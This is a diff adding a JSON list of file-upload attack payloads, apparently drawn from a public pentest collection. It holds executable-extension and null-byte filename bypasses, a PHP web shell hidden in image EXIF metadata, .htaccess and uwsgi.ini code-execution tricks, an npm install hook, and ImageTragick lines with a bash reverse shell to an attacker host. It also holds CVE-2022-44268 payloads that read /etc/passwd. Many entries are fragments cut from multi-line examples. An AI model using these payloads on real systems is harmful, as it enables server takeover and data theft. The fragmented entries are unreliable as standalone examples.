@@ -1,0 +1,767 @@
+[
+  {
+    "id": "file-upload-1",
+    "title": "Defaults Extensions",
+    "payload": ".php",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-2",
+    "title": "Defaults Extensions",
+    "payload": ".php3",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-3",
+    "title": "Defaults Extensions",
+    "payload": ".php4",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-4",
+    "title": "Defaults Extensions",
+    "payload": ".php5",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-5",
+    "title": "Defaults Extensions",
+    "payload": ".php7",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-6",
+    "title": "Defaults Extensions",
+    "payload": ".pht",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-7",
+    "title": "Defaults Extensions",
+    "payload": ".phps",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-8",
+    "title": "Defaults Extensions",
+    "payload": ".phar",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-9",
+    "title": "Defaults Extensions",
+    "payload": ".phpt",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-10",
+    "title": "Defaults Extensions",
+    "payload": ".pgif",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-11",
+    "title": "Defaults Extensions",
+    "payload": ".phtml",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-12",
+    "title": "Defaults Extensions",
+    "payload": ".phtm",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-13",
+    "title": "Defaults Extensions",
+    "payload": ".inc",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-14",
+    "title": "Defaults Extensions",
+    "payload": ".asp",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-15",
+    "title": "Defaults Extensions",
+    "payload": ".aspx",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-16",
+    "title": "Defaults Extensions",
+    "payload": ".config",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-17",
+    "title": "Defaults Extensions",
+    "payload": ".cer # (IIS <= 7.5)",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-18",
+    "title": "Defaults Extensions",
+    "payload": ".asa # (IIS <= 7.5)",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-19",
+    "title": "Defaults Extensions",
+    "payload": "shell.aspx;1.jpg # (IIS < 7.0)",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-20",
+    "title": "Defaults Extensions",
+    "payload": "shell.soap",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-21",
+    "title": "Defaults Extensions",
+    "payload": ".svg",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-22",
+    "title": "Defaults Extensions",
+    "payload": ".gif",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-23",
+    "title": "Defaults Extensions",
+    "payload": ".csv",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-24",
+    "title": "Defaults Extensions",
+    "payload": ".xml",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-25",
+    "title": "Defaults Extensions",
+    "payload": ".avi",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-26",
+    "title": "Defaults Extensions",
+    "payload": ".js",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-27",
+    "title": "Defaults Extensions",
+    "payload": ".zip",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-28",
+    "title": "Defaults Extensions",
+    "payload": ".html",
+    "context": "Defaults Extensions",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-29",
+    "title": "Upload Tricks",
+    "payload": "Content-Type: image/gif",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-30",
+    "title": "Upload Tricks",
+    "payload": "Content-Type: image/png",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-31",
+    "title": "Upload Tricks",
+    "payload": "Content-Type: image/jpeg",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-32",
+    "title": "Upload Tricks",
+    "payload": "text/php",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-33",
+    "title": "Upload Tricks",
+    "payload": "text/x-php",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-34",
+    "title": "Upload Tricks",
+    "payload": "application/php",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-35",
+    "title": "Upload Tricks",
+    "payload": "application/x-php",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-36",
+    "title": "Upload Tricks",
+    "payload": "application/x-httpd-php",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-37",
+    "title": "Upload Tricks",
+    "payload": "application/x-httpd-php-source",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-38",
+    "title": "Upload Tricks",
+    "payload": "<script language=\"php\">system(\"id\");</script>",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-39",
+    "title": "Upload Tricks",
+    "payload": "<?=`id`?>",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-40",
+    "title": "Upload Tricks",
+    "payload": ".php%00.gif",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-41",
+    "title": "Upload Tricks",
+    "payload": ".php\\x00.gif",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-42",
+    "title": "Upload Tricks",
+    "payload": ".php%00.png",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-43",
+    "title": "Upload Tricks",
+    "payload": ".php\\x00.png",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-44",
+    "title": "Upload Tricks",
+    "payload": ".php%00.jpg",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-45",
+    "title": "Upload Tricks",
+    "payload": ".php\\x00.jpg",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-46",
+    "title": "Upload Tricks",
+    "payload": "file.php%20",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-47",
+    "title": "Upload Tricks",
+    "payload": "file.php%0d%0a.jpg",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-48",
+    "title": "Upload Tricks",
+    "payload": "file.php%0a",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-49",
+    "title": "Upload Tricks",
+    "payload": "\\x3E",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-50",
+    "title": "Upload Tricks",
+    "payload": "\\x3C",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-51",
+    "title": "Upload Tricks",
+    "payload": "\\x22",
+    "context": "Upload Tricks",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-52",
+    "title": "Picture Metadata",
+    "payload": "convert -size 110x110 xc:white payload.jpg",
+    "context": "Picture Metadata",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-53",
+    "title": "Picture Metadata",
+    "payload": "exiftool -Copyright=\"PayloadsAllTheThings\" -Artist=\"Pentest\" -ImageUniqueID=\"Example\" payload.jpg",
+    "context": "Picture Metadata",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-54",
+    "title": "Picture Metadata",
+    "payload": "exiftool -Comment=\"<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();\" img.jpg",
+    "context": "Picture Metadata",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-55",
+    "title": "Apache: .htaccess",
+    "payload": "AddType mime-type extension [extension ...]",
+    "context": "Apache: .htaccess",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-56",
+    "title": "Apache: .htaccess",
+    "payload": "AddType application/x-httpd-php .rce",
+    "context": "Apache: .htaccess",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-57",
+    "title": "WSGI: uwsgi.ini",
+    "payload": "[uwsgi]",
+    "context": "WSGI: uwsgi.ini",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-58",
+    "title": "WSGI: uwsgi.ini",
+    "payload": "foo = @(sym://uwsgi_funny_function)",
+    "context": "WSGI: uwsgi.ini",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-59",
+    "title": "WSGI: uwsgi.ini",
+    "payload": "bar = @(data://[ATTACKER.DOMAIN.TLD])",
+    "context": "WSGI: uwsgi.ini",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-60",
+    "title": "WSGI: uwsgi.ini",
+    "payload": "test = @(http://[ATTACKER.DOMAIN.TLD])",
+    "context": "WSGI: uwsgi.ini",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-61",
+    "title": "WSGI: uwsgi.ini",
+    "payload": "content = @(fd://[ATTACKER.DOMAIN.TLD])",
+    "context": "WSGI: uwsgi.ini",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-62",
+    "title": "WSGI: uwsgi.ini",
+    "payload": "body = @(exec://whoami)",
+    "context": "WSGI: uwsgi.ini",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-63",
+    "title": "WSGI: uwsgi.ini",
+    "payload": "characters = @(call://uwsgi_func)",
+    "context": "WSGI: uwsgi.ini",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-64",
+    "title": "Dependency Manager",
+    "payload": "\"scripts\": {",
+    "context": "Dependency Manager",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-65",
+    "title": "Dependency Manager",
+    "payload": "\"prepare\" : \"/bin/touch /tmp/pwned.txt\"",
+    "context": "Dependency Manager",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-66",
+    "title": "Dependency Manager",
+    "payload": "\"pre-command-run\" : [",
+    "context": "Dependency Manager",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-67",
+    "title": "Dependency Manager",
+    "payload": "\"/bin/touch /tmp/pwned.txt\"",
+    "context": "Dependency Manager",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-68",
+    "title": "home location",
+    "payload": "Example of malicious use, this will create a reverse shell that will connect back to the attacker's machine every time a Python process starts in that environment.:",
+    "context": "home location",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-69",
+    "title": "CVE-2016–3714 - ImageTragik",
+    "payload": "push graphic-context",
+    "context": "CVE-2016–3714 - ImageTragik",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-70",
+    "title": "CVE-2016–3714 - ImageTragik",
+    "payload": "viewbox 0 0 640 480",
+    "context": "CVE-2016–3714 - ImageTragik",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-71",
+    "title": "CVE-2016–3714 - ImageTragik",
+    "payload": "fill 'url(https://127.0.0.1/test.jpg\"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch \"hello)'",
+    "context": "CVE-2016–3714 - ImageTragik",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-72",
+    "title": "CVE-2016–3714 - ImageTragik",
+    "payload": "pop graphic-context",
+    "context": "CVE-2016–3714 - ImageTragik",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-73",
+    "title": "CVE-2016–3714 - ImageTragik",
+    "payload": "%!PS",
+    "context": "CVE-2016–3714 - ImageTragik",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-74",
+    "title": "CVE-2016–3714 - ImageTragik",
+    "payload": "userdict /setpagedevice undef",
+    "context": "CVE-2016–3714 - ImageTragik",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-75",
+    "title": "CVE-2016–3714 - ImageTragik",
+    "payload": "save",
+    "context": "CVE-2016–3714 - ImageTragik",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-76",
+    "title": "CVE-2016–3714 - ImageTragik",
+    "payload": "legal",
+    "context": "CVE-2016–3714 - ImageTragik",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-77",
+    "title": "CVE-2016–3714 - ImageTragik",
+    "payload": "{ null restore } stopped { pop } if",
+    "context": "CVE-2016–3714 - ImageTragik",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-78",
+    "title": "CVE-2016–3714 - ImageTragik",
+    "payload": "{ legal } stopped { pop } if",
+    "context": "CVE-2016–3714 - ImageTragik",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-79",
+    "title": "CVE-2016–3714 - ImageTragik",
+    "payload": "restore",
+    "context": "CVE-2016–3714 - ImageTragik",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-80",
+    "title": "CVE-2016–3714 - ImageTragik",
+    "payload": "mark /OutputFile (%pipe%id) currentdevice putdeviceprops",
+    "context": "CVE-2016–3714 - ImageTragik",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-81",
+    "title": "CVE-2016–3714 - ImageTragik",
+    "payload": "convert shellexec.jpeg whatever.gif",
+    "context": "CVE-2016–3714 - ImageTragik",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-82",
+    "title": "CVE-2022-44268",
+    "payload": "apt-get install pngcrush imagemagick exiftool exiv2 -y",
+    "context": "CVE-2022-44268",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-83",
+    "title": "CVE-2022-44268",
+    "payload": "pngcrush -text a \"profile\" \"/etc/passwd\" exploit.png",
+    "context": "CVE-2022-44268",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-84",
+    "title": "CVE - FFMpeg HLS",
+    "payload": "GOD.txt",
+    "context": "CVE - FFMpeg HLS",
+    "tags": [
+      "file-upload"
+    ]
+  },
+  {
+    "id": "file-upload-85",
+    "title": "CVE - FFMpeg HLS",
+    "payload": "/etc/passwd",
+    "context": "CVE - FFMpeg HLS",
+    "tags": [
+      "file-upload"
+    ]
+  }
+]
